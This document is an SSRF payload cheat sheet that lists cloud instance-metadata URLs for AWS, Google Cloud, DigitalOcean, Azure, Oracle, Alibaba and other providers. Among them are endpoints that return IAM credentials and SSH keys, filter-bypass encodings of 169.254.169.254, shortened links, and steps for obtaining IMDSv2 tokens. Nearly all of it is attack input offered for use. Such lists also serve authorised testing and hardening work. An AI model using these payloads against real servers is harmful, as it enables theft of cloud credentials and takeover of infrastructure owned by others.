# Extract metadata with SSRF (Server-Side Request Forgery)

# AWS
From http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories

* http://169.254.169.254/latest/user-data
* http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE-NAME]
* http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
* http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
* http://169.254.169.254/latest/meta-data/ami-id
* http://169.254.169.254/latest/meta-data/reservation-id
* http://169.254.169.254/latest/meta-data/hostname
* http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
* http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
* http://169.254.170.2/v2/credentials/[UID]

### Other notations

* http://2852039166/latest/user-data
* http://169.254.43518/latest/user-data
* http://169.16689662/latest/user-data
* http://0xa9fea9fe/latest/user-data

### Shortners

* https://bit.ly/3pLoO2s
* https://bit.ly/3EnV0gh

### IPv6 

* fd00:ec2::254

# AWS - Dirs 

* http://169.254.169.254/
* http://169.254.169.254/latest/meta-data/
* http://169.254.169.254/latest/meta-data/public-keys/

## IMDSv2

If you can make PUT request :

PUT request to http://169.254.169.254/latest/api/token with the custom header `x-aws-ec2-metadata-token-ttl-seconds` with the value of the number of seconds for which the token needs to be active. Put the extracted token to the header `x-aws-ec2-metadata-token` and try the requests above.


# Google Cloud
From https://cloud.google.com/compute/docs/metadata

###  Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"

* http://169.254.169.254/computeMetadata/v1/
* http://metadata.google.internal/computeMetadata/v1/
* http://metadata/computeMetadata/v1/
* http://metadata.google.internal/computeMetadata/v1/instance/hostname
* http://metadata.google.internal/computeMetadata/v1/instance/id
* http://metadata.google.internal/computeMetadata/v1/project/project-id

## Google allows recursive pulls 

* http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true

###  Beta does NOT require a header atm

* http://metadata.google.internal/computeMetadata/v1beta1/

# Digital Ocean
From https://developers.digitalocean.com/documentation/metadata/

* http://169.254.169.254/metadata/v1.json
* http://169.254.169.254/metadata/v1/ 
* http://169.254.169.254/metadata/v1/id
* http://169.254.169.254/metadata/v1/user-data
* http://169.254.169.254/metadata/v1/hostname
* http://169.254.169.254/metadata/v1/region
* http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

# Packetcloud

https://metadata.packet.net/userdata

# Azure

From https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/
From https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service

## Requires the header "Metadata: true"

* http://169.254.169.254/metadata/v1/maintenance
* http://169.254.169.254/metadata/instance?api-version=2017-04-02
* http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text

# OpenStack/RackSpace 
### (header required? unknown)

* http://169.254.169.254/openstack

# HP Helion 
### (header required? unknown)

* http://169.254.169.254/2009-04-04/meta-data/ 

# Oracle Cloud

* http://192.0.0.192/latest/
* http://192.0.0.192/latest/user-data/
* http://192.0.0.192/latest/meta-data/
* http://192.0.0.192/latest/attributes/

# Alibaba

* http://100.100.100.200/latest/meta-data/
* http://100.100.100.200/latest/meta-data/instance-id
* http://100.100.100.200/latest/meta-data/image-id
